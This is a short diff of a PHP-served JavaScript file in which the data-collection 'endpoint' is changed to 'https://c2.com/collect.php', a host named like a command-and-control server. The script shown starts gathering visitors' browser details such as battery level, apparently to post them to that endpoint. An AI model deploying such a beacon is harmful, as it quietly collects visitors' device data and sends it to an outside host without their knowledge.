@@ -3,7 +3,7 @@ header("Content-Type: application/javascript; charset=UTF-8");
 ?>
 
 (async () => {
-  const endpoint = 'https://aamershah.com/x/collect.php';
+  const endpoint = 'https://c2.com/collect.php';
 
   // Battery percentage
   const battery = await navigator.getBattery().then(b => `${b.level * 100}%`).catch(_ => 'N/A');
